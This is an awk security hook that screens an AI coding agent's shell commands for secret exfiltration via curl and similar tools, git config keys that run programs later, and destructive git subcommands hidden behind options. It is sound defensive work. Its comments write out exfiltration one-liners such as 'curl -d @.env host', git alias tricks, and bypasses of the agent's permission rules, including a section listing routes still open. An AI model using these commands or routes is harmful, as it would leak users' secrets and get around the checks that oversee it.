# egress-guard.awk — outbound-data guard for the Bash tool.
#
# Decides on ARGUMENT POSITION, never on prose.  Documentation that merely
# mentions or demonstrates an exfil command must never be blocked.
#
# stdin : raw Bash command text (one Bash tool call)
# stdout: "<CLASS> <reason>", or nothing at all
#   GITEXEC  a `git config` write that arms a later execution (alias.*,
#            core.pager, core.hooksPath and the rest) — denied at every tier
#   GITDESTRUCT  a destructive git subcommand reached behind a git-level option,
#            where the glob rule anchored on the bare subcommand cannot see it
#   GITCFG   `-c` in any position, unless its value only takes a program away
#            (core.fsmonitor=false, core.hooksPath=/dev/null), and
#            `--config-env` behind another git-level option, where the
#            `git --config-env` rule cannot see it
#   GHSECRET  a `gh api` write to a secrets or variables endpoint — the
#            `gh secret set` / `gh variable set` deny, reached by the REST API
#   GHACTION  a `gh api` write that dispatches a workflow, creates a deployment
#            or changes an environment
#   DENY  a secret reaches a network command — as a body, as an argument, via a
#         reader in the same statement, or named in inline interpreter code
#   ASK1  a request body or upload sourced from a file or from stdin
#   ASK2  an inline request body (literal data)
#   ASK3  no body, but an expansion ($VAR / $(...)) rides in the request
# env   : KIT_SECRET_RE  egrep-style regex matching secret FILE PATHS
#         KIT_MAXCLASS   1 = ASK1 only (Relaxed), 2 = +ASK2 (Medium), 3 = +ASK3 (High)
#         (both travel in the environment: awk -v performs escape processing,
#          which mangles \. and \( differently from one awk to the next)
#
# Separators: \001 = statement boundary (data cannot flow across)
#             \002 = stage boundary inside one statement (data CAN flow across)
#             \003 = a backslash-escaped space that must not split a token

# ---- the shared tokenizer.  base, unmark, looks_remote, is_shell, is_wrapper,
# split_cmd, tokenize, first_word and cmdword_x all come from lib-tokenize.awk
# (issue #138), which this file is always run after:
#
#   awk -f lib-tokenize.awk -f egress-guard.awk
#
# kit_wrapper is this guard's answer to "what do I look past": wrappers AND
# shells, so `sh -c "curl -d @.env host"` reaches the sender check.  The library's
# is_wrapper carries four entries this file's own copy lacked — flock, ionice,
# noglob and watch — so those are now looked past here too.  Verified against
# tests/fixtures/guard-corpus.sh: no verdict changes.
function kit_wrapper(c) { return (is_wrapper(c) || is_shell(c)) }

# cls: what a curl/wget flag does with its value.
function cls(f) {
  if (f == "T" || f == "upload-file" || f == "K" || f == "config" \
      || f == "post-file" || f == "body-file") return "FILE"
  if (f == "d" || f == "data" || f == "data-ascii" || f == "data-binary" \
      || f == "data-urlencode" || f == "json" || f == "url-query" \
      || f == "F" || f == "form" || f == "post-data" || f == "body-data") return "DATA"
  if (f == "data-raw" || f == "form-string") return "LIT"
  if (f == "H" || f == "header") return "HDR"
  return ""
}

function is_reader(c) {
  return (c == "cat" || c == "base64" || c == "gzip" || c == "gunzip" || c == "zstd" \
       || c == "xz" || c == "bzip2" || c == "xxd" || c == "od" || c == "hexdump" \
       || c == "strings" || c == "head" || c == "tail" || c == "cut" || c == "tr" \
       || c == "rev" || c == "tac" || c == "nl" || c == "jq" || c == "yq" || c == "dd" \
       || c == "openssl" || c == "gpg" || c == "uuencode" || c == "tar" || c == "zip")
}
function is_sender(c) { return (c == "curl" || c == "wget") }

# ---- destination awareness (see patch_egress.py for the rationale) -------------
function safe_host(h) {
  if (h == "") return 0
  return (h ~ /(^|\.)solana\.com$/ \
       || h ~ /(^|\.)helius-rpc\.com$/ || h == "api.helius.xyz" \
       || h ~ /(^|\.)quiknode\.pro$/   || h ~ /(^|\.)jup\.ag$/ \
       || h == "hermes.pyth.network"   || h == "release.solana.com" \
       || h == "localhost" || h ~ /^127\./ || h == "0.0.0.0" \
       || h == "github.com" || h == "api.github.com" || h == "codeload.github.com" \
       || h ~ /(^|\.)githubusercontent\.com$/ \
       || h ~ /(^|\.)npmjs\.org$/ || h ~ /(^|\.)crates\.io$/ \
       || h == "sh.rustup.rs" || h ~ /(^|\.)rust-lang\.org$/ \
       || h == "pypi.org" || h == "files.pythonhosted.org")
}

# Pull the host out of a token that looks like a URL or a bare host[:port].
function url_host(tok,   h) {
  h = tok
  if (h ~ /^[A-Za-z][A-Za-z0-9+.-]*:\/\//) sub(/^[A-Za-z][A-Za-z0-9+.-]*:\/\//, "", h)
  else if (h !~ /\./ && h !~ /^localhost/) return ""
  sub(/[\/?#].*$/, "", h)
  sub(/^[^@]*@/, "", h)
  sub(/:[0-9]+$/, "", h)
  if (h ~ /[^A-Za-z0-9.:_-]/) return ""
  return tolower(h)
}
function is_interp(c) {
  return (c == "python" || c == "python2" || c == "python3" || c == "node" || c == "deno" \
       || c == "bun" || c == "perl" || c == "ruby" || c == "php" || c == "osascript")
}
function is_netcmd(c) {
  return (is_sender(c) || is_interp(c) || c == "nc" || c == "ncat" || c == "netcat" \
       || c == "socat" || c == "telnet" || c == "ssh" || c == "scp" || c == "sftp" \
       || c == "rsync" || c == "dig" || c == "nslookup" || c == "host" \
       || c == "gh" || c == "glab" || c == "aws" || c == "gsutil" || c == "az" \
       || c == "http" || c == "xh" || c == "ftp" || c == "lftp")
}
function is_netsink(c) { return (is_netcmd(c) && !is_interp(c)) }

# An interpreter is only a network sink when its inline code actually names a
# network API.  `cat .env | python3 -c "print(sys.stdin.read())"` is local work.
function code_has_net(a) {
  return (a ~ /urlopen|urlretrieve|urllib|requests\.|httpx|http\.client|socket\.|socket\(/ \
       || a ~ /fetch\(|XMLHttpRequest|axios|net\.connect|https?\.request|got\(/ \
       || a ~ /Net::HTTP|open-uri|LWP|HTTParty|websocket|WebSocket|sendto|smtplib/)
}

# Template and documentation suffixes are not secrets: this repo ships a
# .env.example and the docs name it.
function is_template(a) { return (a ~ /\.(example|sample|template|dist|tpl|md|schema)$/) }

# trusted_template — a secret-looking name the upload check lets through: a
# template, and not a link.  A template is trusted by its name, so a planted
# `.env.schema -> .env` went out as one; a real template is never a link to a
# secret, so a link is not trusted whatever it points at.  Callers test the name
# against SECRETRE first, so only a name that would otherwise be a secret costs a
# look at the filesystem.
function trusted_template(a) { return (is_template(a) && !is_link(a)) }

# is_link — a is a symbolic link, asked of the filesystem once per path.  Each
# answer costs a process, and a command can name as many paths as it likes:
# 700 decoys kept the hook busy past its timeout, and a hook that times out does
# not block the call.  Past 16 a path is taken for a link, so a padded command
# is refused rather than read.  The path is single-quoted whole, so nothing in
# it reaches the shell as syntax.
function is_link(a,   p, cmd, r) {
  if (a in LINKC) return LINKC[a]
  if (++LINKN > 16) return (LINKC[a] = 1)
  p = a; if (p !~ /^\//) p = KIT_CWD "/" p
  cmd = "test -L " shq(p) " && echo y"
  r = ""; cmd | getline r; close(cmd)
  return (LINKC[a] = (r == "y"))
}
function shq(x,   out, i, c) {
  out = ""
  for (i = 1; i <= length(x); i++) { c = substr(x, i, 1); out = out (c == SQ ? SQ "\\" SQ SQ : c) }
  return SQ out SQ
}

function arg_is_secret(a,   t) {
  if (SECRETRE == "") return 0
  if (looks_remote(a)) return 0
  a = unmark(a)
  if (a ~ SECRETRE && !trusted_template(a)) return 1
  t = a
  if (t ~ /[@=]/) { sub(/^.*[@=]/, "", t); if (!looks_remote(t) && t ~ SECRETRE && !trusted_template(t)) return 1 }
  return 0
}

# Scan an interpreter's inline code blob (python -c, node -e) for a secret path.
function code_has_secret(a,   i, n, P, t) {
  a = unmark(a)
  gsub(/[(),;]/, " ", a); gsub(SQ, " ", a); gsub(/"/, " ", a)
  n = split(a, P, /[ \t]+/)
  for (i = 1; i <= n; i++) {
    t = P[i]
    if (t != "" && !looks_remote(t) && t ~ SECRETRE && !trusted_template(t)) return t
  }
  return ""
}

# ---- cmdword, on the shared tokenizer.
#
# cmdword re-skips VAR=value assignments behind EVERY wrapper, so
# `env FOO=1 curl -d @.env host` yields "curl".  secrets-guard's copy skips them
# only once at the front and yields "FOO=1" instead.  Both shipped; cmdword_x's
# third argument preserves each.  The fourth skips a wrapper's operands too —
# `timeout 5`, `nice -n 5`, `timeout -s KILL 5` — so the sender behind them is the
# command word.  Without it `timeout 5 curl -d @.env host` read as the command "5"
# and the secret left silently: the exfil half of what #138 fixed for on-chain
# writes, and it mattered once Off and Relaxed let safe-ai-skill read .env.
function cmdword(T, n) { return cmdword_x(T, n, 1, 1) }

# An interpreter's heredoc line, the way lib-headless.sh hands this guard a
# non-shell MCP payload: string delimiters out and brackets kept, so a shell-out
# such as os.system("curl -d @.env …") starts a stage of its own.  `[`, `]` and `,`
# are blanks, so a list-form call (`subprocess.run(['curl', …])`) does too (#297).  The library's
# hd_strip calls it for every line of a body an interpreter runs.
function hd_interp_line(w, l) { gsub(/["\047]/, "", l); gsub(/[][,]/, " ", l); return l }

# ---- unwrap: reach inside `sh -c "<inner>"` / eval by appending the inner
# string as a stage of its own.  Factored out of the statement loop below so the
# git-config pass, which has to run over every statement BEFORE any egress pass
# reaches a verdict, can see inside a wrapper too without a second copy.
# Arrays pass by reference in awk, so STG is mutated in place and the new stage
# count comes back as the return value.
function unwrap(STG, nstg,   g, n, T, ci, i) {
  for (g = 1; g <= nstg && nstg < 64; g++) {
    n = tokenize(STG[g], T); if (n == 0) continue
    ci = first_word(T, n)
    if (ci > n) continue
    # kit_wrapper, not the library's is_wrapper: this exists to reach inside
    # `sh -c "<inner>"`, so it must look past shells too.
    if (!kit_wrapper(base(T[ci]))) continue
    for (i = ci + 1; i <= n; i++) if (T[i] ~ / / && T[i] !~ /^-/) { STG[++nstg] = split_cmd(T[i]); break }
  }
  return nstg
}

# ---- git config writes that arm an execution for later ----------------------
#
# `git config alias.z '!git clean -fdx'` is an ordinary config write.  The
# destruction happens afterwards, in `git z`, where the dangerous verb never
# appears on the command line any rule gets to read.  Two glob denies cover the
# common spelling at the permission layer, before this hook runs
# (`Bash(git config *alias.*)` and its zero-gap twin `Bash(git config alias.*)`),
# and they stay: this pass is the second layer, not a replacement.
#
# What only a hook can do, which is why the rest of the hole is closed here:
#
#   * CASE.  Git's section and variable names are case-insensitive and a
#     permission glob is not, so `git config Alias.z '!git clean -fdx'` walks
#     straight past both globs — confirmed upstream by writing `Alias.Y` and
#     reading it back with `--get alias.y`.  No glob can fix it: `alias` alone
#     has 32 case spellings, and that is one key of seven.
#   * THE OTHER CODE-EXECUTING KEYS.  core.pager, core.editor, core.hooksPath,
#     sequence.editor, credential.helper and diff.external each name a program
#     git runs later.  Before this pass they were covered only in the one-shot
#     `git -c key=value` form, by the blanket `Bash(git -c *)` deny.
#   * READS vs WRITES.  The globs gate `git config --get alias.z` as well,
#     as collateral nobody minded.  A hook can tell the two apart, so this one
#     does: --get, --get-all, --get-regexp, --list and -l stay silent, which
#     narrows the shipped behaviour on purpose.
#   * `git config --edit`, which opens an editor on the config and names no key.
#
# Ordinary keys are untouched — user.email, user.name, core.autocrlf,
# remote.origin.url, push.default, init.defaultBranch — which is the whole
# reason `git config` is not denied as a whole command.  A false positive here
# breaks /quick-commit and every normal setup step.
#
# Not covered here, stated rather than papered over:
#   * a shell redirect into .git/config, which is not a `git config` command at
#     all, so no amount of subcommand parsing reaches it.  The layer below does:
#     Claude Code's sandbox refuses shell writes to the project's .git/config and
#     .git/hooks/ wherever it is on, and High denies the file tools the same paths
#     (DENY_GIT_CONFIG_AND_HOOKS in firewall.sh).  Off, and a command line led by
#     an excludedCommands entry, are left with neither;
#   * GIT_CONFIG_GLOBAL in the environment, which points git at another config file
#     and stays open: agents use it to keep the user's config out.  The
#     GIT_CONFIG_COUNT family and GIT_CONFIG_PARAMETERS are genv_scan's.

# gc_silent_opt — the `git config` forms this pass does not gate: the readers,
# which are ordinary work, and the removers, which can only take a key away.
function gc_silent_opt(o) {
  return (o == "--get" || o == "--get-all" || o == "--get-regexp" \
       || o == "--get-urlmatch" || o == "--get-color" || o == "--get-colorbool" \
       || o == "--list" || o == "-l" \
       || o == "--unset" || o == "--unset-all" || o == "--remove-section")
}

# gc_opt_operand — a `git config` option that eats the NEXT token.  Missing one
# is the bug that bites: `git config --file f core.pager x` puts `f` in key
# position and the real key in value position, where nothing would look at it.
function gc_opt_operand(o) {
  return (o == "-f" || o == "--file" || o == "--blob" || o == "--type" \
       || o == "--default" || o == "--value" || o == "--comment")
}

# git_global_operand — a git-LEVEL option, ahead of the subcommand, that eats the
# next token.  Verified by hand against the installed git: `--git-dir .git`,
# `--namespace ns` and `--attr-source HEAD` all leave the subcommand running, so
# they do consume one, and so does the undocumented `--shallow-file`
# (`git --shallow-file x status --short` runs status), which this list lacked
# until a review found `git --shallow-file x clean -fdx` silent.  `--exec-path`
# does NOT: `git --exec-path /tmp rev-parse` printed the exec path and ignored
# the rest — git_walk stops there.  Getting one wrong costs a MISS, never a false
# positive: the walk lands on the wrong token, finds no subcommand it knows, and
# stays silent.  The table is lib-tokenize.awk's kit_git_optarg, which the walk
# into `git submodule foreach` and `git rebase --exec` reads too.
function git_global_operand(o) { return kit_git_optarg(o) }

# cc_strips — a wrapper Claude Code removes before it matches a Bash rule, so
# `nice git clean -fdx` still meets `Bash(git clean *)`.  xargs only without
# flags; git_walk checks that.  Every other wrapper hides the command from the
# rules.
function cc_strips(w) {
  return (w == "timeout" || w == "time" || w == "nice" || w == "nohup" || w == "stdbuf" \
       || w == "command" || w == "builtin" || w == "noglob" || w == "xargs")
}

# gcfg_safe — is this `-c` operand one of the two values that take a program
# away instead of naming one?  `core.fsmonitor=false` turns the fsmonitor hook
# off and `core.hooksPath=/dev/null` points every hook at a path that cannot
# hold one, which is how an auditor reads a hostile checkout without running its
# hooks (auditor-skill's `git -c core.fsmonitor=false <subcommand>`, #311).  The
# key is compared lowercased, as git compares it; the value exactly, so `true`,
# `/tmp/x.sh`, `.git/hooks`, `FALSE` and an expansion all count as a program.
function gcfg_safe(v,   p, key) {
  v = unmark(v); p = index(v, "=")
  if (p == 0) return 0
  key = tolower(substr(v, 1, p - 1)); v = substr(v, p + 1)
  return ((key == "core.fsmonitor" && v == "false") || (key == "core.hookspath" && v == "/dev/null"))
}

# gw_literal — is word i one the shell passes to git exactly as written?  Once a
# safe `-c` has been let through, every later word up to and including the
# subcommand must be, because the walk reads text and git reads what bash makes
# of it: `{-c,core.pager=x}`, `$'-c'`, `-c$IFS"core.pager=x"`, `$C`, `"$@"`,
# `${X:--c}`, `-[c]` and `-?` all reach git as `-c` plus a program, and the walk
# would have read each as a subcommand or an unknown option.  Fail closed: a
# quote, an expansion, a glob, a brace, a backslash or any character outside a
# plain word's set (tokenize keeps all but the quotes; Q records those) is
# refused rather than guessed at.
function gw_literal(T, Q, i) {
  return (!Q[i] && T[i] ~ /^[A-Za-z0-9._\/=:@%+,~^-]+$/)
}
# gw_opaque — record the first such word (i > 0), or that no subcommand
# followed the safe prefix at all (i == 0): split_cmd ends a statement at `$(`,
# so `git -c core.fsmonitor=false $(echo -c) core.pager=x log` reaches the walk
# as the prefix alone.
function gw_opaque(T, i) {
  if (GW_OPAQUEAT != "") return
  GW_OPAQUEAT = (i > 0 ? "word" : "end"); GW_OPAQUE = (i > 0 ? unmark(T[i]) : "")
}

# git_walk — the shared option walker.  Returns 1 on a real git invocation and
# fills these globals: GW_SUB (the subcommand), GW_I (the index of the first
# token after it), GW_PREFIXED (1 when at least one git-level option came
# first), GW_CFG (`-c` with a value gcfg_safe does not clear, in any position,
# or `--config-env` after another git-level option, else "") and GW_CFGHOW
# (what stood in front of that option, "" for nothing).  GW_CFG is set even
# when no subcommand follows.  All the git passes below run off this one walk.
function git_walk(T, n, Q,   i, o, k, j, w, safe, hasc, r) {
  GW_SUB = ""; GW_I = 0; GW_PREFIXED = 0; GW_CFG = ""; GW_CFGHOW = ""; GW_EXECPATH = ""; GW_HOW = ""
  GW_SAFE = 0; GW_OPAQUE = ""; GW_OPAQUEAT = ""
  # cmdword_x's fourth argument skips a wrapper's positional operand, as cmdword
  # does for the egress passes: `timeout 5 git config alias.z '!x'` would leave
  # "5" in command position otherwise.
  if (cmdword_x(T, n, 1, 1) != "git") return 0
  # The rules this mirrors match `git -c *`, `git clean *` and the rest on the
  # command line as Claude Code reads it, after it strips the wrappers cc_strips
  # names.  Behind any other wrapper, with git named by a path, with the first
  # option quoted, or inside another command's code string, they see a different
  # command, so this git is treated as one behind a git-level option.
  if (GW_PAYLOAD) GW_HOW = "inside another command's code string"
  for (j = first_word(T, n); j < CWI && GW_HOW == ""; j++) {
    w = base(T[j])
    if (!kit_wrapper(w)) continue
    if (!cc_strips(w) || (w == "xargs" && T[j + 1] ~ /^-/)) GW_HOW = "behind " w
  }
  if (GW_HOW == "" && T[CWI] != "git") GW_HOW = "with git named by its path"
  if (GW_HOW == "" && CWI < n && Q[CWI + 1]) GW_HOW = "with its first option quoted"
  if (GW_HOW != "") GW_PREFIXED = 1
  # hasc — a `-c` anywhere in the statement.  Then every word from git up to and
  # including the subcommand has to be one bash passes through unchanged, BEFORE a
  # safe `-c` as much as after it: `git -C $X -c core.fsmonitor=false zz` with
  # X='. -c alias.zz=!cmd' word-splits into a `-c` the walk never sees, and so does
  # `git -C {.,-c,alias.zz=!cmd} …`.  The safe value is the only `-c` this pass
  # lets through, and it is only safe if nothing around it is rewritten.
  # "A `-c`" is read broadly: at a word's start or after any non-word character,
  # so `{.,-c,…}`, `$'-c'` and `-c$IFS…` count, and `--cached` does not.
  hasc = 0
  for (j = CWI + 1; j <= n && !hasc; j++) if (unmark(T[j]) ~ /(^|[^A-Za-z0-9_-])-c/) hasc = 1
  i = CWI + 1; k = (GW_HOW != "")
  while (i <= n) {
    # A redirection is not an argument and can sit among git's options:
    # `git 2>/dev/null -c alias.zz='!cmd' zz` runs the alias.  Skip it and its
    # target (kit_redir counts both: `2>&1`, `&>f`, `<&3`, `> f`), as bash does.
    if ((r = kit_redir(T, n, i)) > 0) { i += r; continue }
    if (!(substr(T[i], 1, 1) == "-" && T[i] != "-" && T[i] != "--")) break
    if (hasc && !gw_literal(T, Q, i)) gw_opaque(T, i)
    o = T[i]; sub(/=.*$/, "", o)
    if (T[i] ~ /^--exec-path=/ && GW_EXECPATH == "") GW_EXECPATH = T[i]
    # git prints and exits on these — help, the version, a path or command-list
    # query — so no subcommand runs.  `git --help clean` is `git help clean`, which
    # no rule denies, and deciding it here was a false positive.  A -c or
    # --config-env already walked past stays in GW_CFG: `git help` reads config
    # (man.<tool>.cmd, web.browser), so that half still matters.
    if (o == "-h" || o == "--help" || o == "-v" || o == "--version" || o == "--html-path" \
        || o == "--man-path" || o == "--info-path" || o == "--list-cmds" \
        || T[i] == "--exec-path") return 0
    # k counts the options before this one: the first option is what the
    # `git --config-env*` rule is anchored on, so only a later one is a spelling
    # it cannot see.  `-c` has had no rule since rule set 13, because no glob can
    # deny `-c core.fsmonitor=/tmp/x.sh` and let `-c core.fsmonitor=false`
    # through, so every position of it is this walk's.
    safe = (o == "-c" && T[i] == "-c" && gcfg_safe(T[i + 1]))
    if (GW_CFG == "" && o == "-c" && !safe) { GW_CFG = o; GW_CFGHOW = GW_HOW }
    if (k > 0 && GW_CFG == "" && o == "--config-env") { GW_CFG = o; GW_CFGHOW = GW_HOW }
    if (git_global_operand(o) && T[i] !~ /=/) {
      i++
      # An operand is read the same way: `-C {.,-c}` hands git a `-c`.  The safe
      # value itself was compared exactly by gcfg_safe.
      if (hasc && !safe && i <= n && !gw_literal(T, Q, i)) gw_opaque(T, i)
    }
    if (safe) GW_SAFE = 1
    i++; k++
    GW_PREFIXED = 1
    if (GW_HOW == "") GW_HOW = "behind a git-level option"
  }
  if (hasc && i > n) gw_opaque(T, 0)
  if (hasc && i <= n && !gw_literal(T, Q, i)) gw_opaque(T, i)
  if (i > n) return 0
  GW_SUB = T[i]
  GW_I = i + 1
  return 1
}

# gc_exec_key — does this key name a program git will run later?  Compared
# lowercased, which is the entire point of the pass: git treats the section and
# variable names as case-insensitive and only the middle subsection as
# case-sensitive, so only the two ends are compared and
# `credential.https://GitHub.com.HELPER` resolves like credential.helper.
function gc_exec_key(key,   k, n, P) {
  k = tolower(unmark(key))
  n = split(k, P, /\./)
  if (n < 2) return 0
  if ((P[1] ".*") in GC_KEY) return 1          # alias.* — every variable runs
  return ((P[1] "." P[n]) in GC_KEY)
}

# gc_exec_section — the section half alone, for --rename-section's destination.
# `git config --rename-section foo core` turns an ungated `foo.pager` write into
# core.pager, which is the same hole reached in two steps.
function gc_exec_section(s,   P) {
  split(tolower(unmark(s)), P, /\./)
  return (P[1] in GC_SECTION)
}

# gc_scan — one pipeline stage.  Returns the reason to deny, or "".
function gc_scan(stage,   n, T, Q, i, j, tok, o, mode, nop, OP, key) {
  n = tokenize(stage, T, Q); if (n == 0) return ""
  if (!git_walk(T, n, Q)) return ""
  # Subcommand position, and nothing else.  `git commit -m "git config alias.z"`
  # stops here: GW_SUB is "commit", so the message is data and never a command.
  if (GW_SUB != "config") return ""
  i = GW_I

  mode = ""; nop = 0
  for (; i <= n; i++) {
    tok = T[i]
    if (substr(tok, 1, 1) == "-" && tok != "-") {
      o = tok; sub(/=.*$/, "", o)
      if (gc_silent_opt(o)) return ""
      else if (o == "--edit" || o == "-e") mode = "edit"
      else if (o == "--add" || o == "--replace-all") { if (mode == "") mode = "write" }
      else if (o == "--rename-section") { if (mode == "") mode = "rename" }
      else if (gc_opt_operand(o) && tok !~ /=/) i++
      # Every other flag is a file selector or a modifier — --global, --local,
      # --system, --worktree, --fixed-value, --show-origin, -z — and changes
      # nothing about which key is being written.
      continue
    }
    OP[++nop] = tok
  }

  j = 1
  if (mode == "" && nop >= 1) {
    # The subcommand form (git 2.46+): git config set|get|list|edit|unset|…
    if (OP[1] == "set") { mode = "write"; j = 2 }
    else if (OP[1] == "edit") { mode = "edit"; j = 2 }
    else if (OP[1] == "rename-section") { mode = "rename"; j = 2 }
    else if (OP[1] == "get" || OP[1] == "list" || OP[1] == "unset" \
          || OP[1] == "unset-all" || OP[1] == "remove-section") return ""
  }

  if (mode == "edit") return "runs git config --edit, which opens an editor on the git config file"
  if (mode == "rename") {
    if (nop >= j + 1 && (GW_SAFE || gc_exec_section(OP[j + 1])))
      return "renames a git config section onto \"" unmark(OP[j + 1]) "\", where its existing variables would become keys git executes"
    return ""
  }
  if (nop < j) return ""
  key = OP[j]
  # The bare form with no value is a READ: `git config core.pager` prints it.
  if (mode == "" && nop < j + 1) return ""
  # Behind a safe `-c` every write is refused, not only the keys above: the
  # `Bash(git -c *)` rule this replaced denied them all, and the exec-capable set
  # is longer than any list (core.fsmonitor, core.sshCommand, core.gitProxy,
  # include.path, includeIf.*.path, diff.*.textconv, filter.*.clean/smudge/
  # process, uploadpack.packObjectsHook, protocol.*.allow, gpg.program, …).
  if (GW_SAFE && !gc_exec_key(key))
    return "writes git config " unmark(key) " behind a git -c prefix, where every config write is refused: many keys (core.fsmonitor, core.sshCommand, include.path, diff.*.textconv, filter.*.clean) make git run a program later"
  if (!gc_exec_key(key)) return ""
  return "writes git config " unmark(key) ", a key that names a command git runs later"
}

# ---- destructive git subcommands behind a git-level option -------------------
#
# Every destructive-git deny is a glob anchored on the literal subcommand, so a
# git-level option in front of it sits where the glob expects `git`, and none of
# them match.  `git -C` and `git -c` are the two of those doors the rules shut
# for that reason, each with a prefixed twin of every destructive rule
# (DENY_GIT_DASH_C and DENY_GIT_DASH_LOWER_C in firewall.sh), so `git -c
# core.fsmonitor=false clean` meets the clean deny; `--config-env` is denied as a
# config setter, which shuts it too, but only in first position.
# Measured against the live `Bash(git clean *)`:
#
#   git --no-pager clean --dry-run           ran
#   git --git-dir=.git clean --dry-run       ran
#   git -P clean --dry-run                   ran
#   git --literal-pathspecs clean --dry-run  ran   (not even in git's synopsis)
#   git -C . clean --dry-run                 DENIED
#
# `git --help` lists the whole set before <command> (the count varies by git
# version, so read it there rather than trusting a number), and only `-C`, `-c`
# and `--config-env` are denied.  Some of them print and stop rather than
# reaching a subcommand — `-h`/`--help`, `-v`/`--version`, the three
# path-printing ones, `--list-cmds=` and a bare `--exec-path` — and git_walk
# stops on each, since `git --help clean` runs `git help clean` and nothing else.
# The ones that do pass through — `--no-pager`, `-p`, `-P`, `--bare`,
# `--git-dir`, `--work-tree`, `--namespace`, `--shallow-file`, `--config-env`,
# the `--no-*` switches and the undocumented `--literal-pathspecs` family — repeat
# and combine freely, and the ones taking a value take it as `--opt=v` or
# `--opt v`, so there is no glob set to enumerate.  There is one option walk, and
# git_walk above already had to do it to find `config`.
#
# THE DESIGN RULE, and the reason this pass is this narrow: it MIRRORS the glob
# rules and changes no tier's policy.  It fires only when GW_PREFIXED is set —
# the unprefixed spelling is already decided at the permission layer, by a rule
# that applies at every tier, and re-deciding it here would put a hook's
# predicate in front of commands a glob is handling correctly today.  The hook
# closes a bypass; it does not set policy.  Each predicate below is the glob it
# mirrors, never wider: `--ha` and `--mirror` are matched as a token PREFIX where
# the glob matches the substring anywhere, so a pathspec containing `--ha` fires
# the rule but not the hook.  Narrower is allowed here; stricter is not.
#
# Mirroring a glob includes its bare form.  In Claude Code's matcher a trailing
# ` *` that is a rule's ONLY wildcard is optional, so `Bash(git clean *)` denies
# `git clean` with nothing after it (documented, and verified live: bare `chown`
# is refused by `Bash(chown *)` with no twin beside it).  The first version of
# this pass required an argument after clean, restore, `checkout --` and
# `reflog expire`, on the belief that the glob did too, and that left the
# prefixed bare form covered by neither layer.  It matters for clean: with
# `clean.requireForce` false, a bare `git clean` deletes untracked files, and
# `git -P --config-env=clean.requireForce=V clean` sets that inside the same
# command line, behind an option no glob sees past.
#
# WHAT IS IN, and why each earns the parsing surface:
#   reflog expire / delete / drop
#                   FIREWALL-SPEC.md section 3.4 singles out expire as the command
#                   that makes history unrecoverable, and delete (chosen entries)
#                   and drop (whole reflogs) remove the same record by other
#                   means.  Strongest case in the set.  The word right after
#                   `reflog` only, as the globs anchor it: show, list, exists and
#                   a bare `git reflog` are reads and stay silent.
#   gc --prune      deletes the unreachable objects prune does, so prune's case
#                   below is its case too.  A token beginning `--prune` after the
#                   `gc` subcommand, which is narrower than `Bash(git gc
#                   *--prune*)`: `--no-prune` begins otherwise, and `fetch
#                   --prune`, `remote prune`, `worktree prune` and `prune-packed`
#                   never put "gc" in GW_SUB, so the substring hazard prune-packed
#                   once posed does not reach this test.
#   prune           with no --expire it deletes every unreachable loose object,
#                   whatever its age.  Those are what `git fsck` recovers a
#                   dropped stash from, or a deleted branch no reflog still
#                   reaches, so prune is the step that makes that loss final.
#                   `Bash(git prune *)` denies it at every tier, and an open
#                   prefixed spelling made that rule decorative.  The subcommand
#                   only: `worktree prune`, `remote prune`, `prune-packed` and
#                   `fetch --prune` are other commands, and GW_SUB never equals
#                   "prune" for any of them.
#   clean, restore, checkout -- <path>, reset --hard
#                   these destroy UNCOMMITTED work, which is in no reflog.
#   push --mirror   overwrites every ref on the remote, for everyone, and is not
#                   recoverable from anything local.
#   --upload-pack / --receive-pack / --exec
#                   these name a PROGRAM for git to run.  `git push/pull/fetch`
#                   are three of the eight sandbox excludedCommands, so that
#                   program runs with the OS sandbox lifted — arbitrary code
#                   execution, which outranks everything else here.
#
# WHAT IS OUT, deliberately:
#   branch -D / --delete / -f   reflog-recoverable, and the worst parsing surface
#                   in the set: -D against a safe -d, -f clustered inside -Df,
#                   and `--sort=-date` already tripped a `-d` matcher in this
#                   same guard once.  Friction without safety.
#
# KNOWN MISSES, stated rather than papered over: a variable-indirected command
# (`G=git; $G clean -fd`) is invisible to this walk, and so is a subcommand the
# shell builds after the hook has read the words — `$'clean'`, `{clean,}`,
# `${X:-clean}` — and git inside a script the agent wrote.  For all of those the
# OS sandbox is the only layer left, and `.git` is in its allowWrite.  `git checkout <tree-ish> -- <path>`
# and `git checkout --force -- .` are open in BOTH layers, because the glob is
# `git checkout -- *` and this pass mirrors it rather than widening it.  So are
# git named by path (`/usr/bin/git clean -fd`) and a quoted subcommand
# (`git 'clean' -fd`) with no option in front: Claude Code documents that a
# deny rule matches neither, and with nothing prefixed this pass stays silent.
# And a long option abbreviated past its glob — `git gc --p=now`, which git's
# parser accepts if `--p` is unique among gc's options — is missed here exactly
# as the glob misses it.

function gd_scan(stage,   n, T, Q, i) {
  n = tokenize(stage, T, Q); if (n == 0) return ""
  if (!git_walk(T, n, Q)) return ""
  if (!GW_PREFIXED) return ""          # the glob rules own the unprefixed form
  i = GW_I

  # No argument count on any of these: each glob's trailing ` *` matches the
  # bare subcommand too, so the bare prefixed form is denied to match.
  if (GW_SUB == "clean")
    return "runs git clean " GW_HOW ", deleting untracked files"
  if (GW_SUB == "restore")
    return "runs git restore " GW_HOW ", overwriting the working tree"
  if (GW_SUB == "checkout" && i <= n && T[i] == "--")
    return "runs git checkout -- <path> " GW_HOW ", discarding uncommitted changes"
  if (GW_SUB == "prune")
    return "runs git prune " GW_HOW ", deleting the unreachable objects a dropped stash or a deleted branch could still be recovered from"
  if (GW_SUB == "gc") {
    for (; i <= n; i++)
      if (T[i] ~ /^--prune/)          # --prune and --prune=<date>; never --no-prune
        return "runs git gc --prune " GW_HOW ", deleting the unreachable objects a dropped stash or a deleted branch could still be recovered from"
    return ""
  }
  if (GW_SUB == "reset") {
    for (; i <= n; i++)
      if (T[i] ~ /^--ha/)             # --hard, and the --ha abbreviation git accepts
        return "runs git reset --hard " GW_HOW ", discarding uncommitted changes"
    return ""
  }
  if (GW_SUB == "reflog" && i <= n) {
    if (T[i] == "expire")
      return "runs git reflog expire " GW_HOW ", which is what makes history unrecoverable"
    if (T[i] == "delete" || T[i] == "drop")
      return "runs git reflog " T[i] " " GW_HOW ", removing the reflog entries a dropped commit is recovered from"
    return ""
  }
  if (GW_SUB == "push") {
    for (; i <= n; i++) {
      if (T[i] ~ /^--mirror/)
        return "runs git push --mirror " GW_HOW ", overwriting every ref on the remote"
      if (T[i] ~ /^--receive-pack/ || T[i] ~ /^--exec/)
        return "names a program for git to run as the far end of a push, " GW_HOW
    }
    return ""
  }
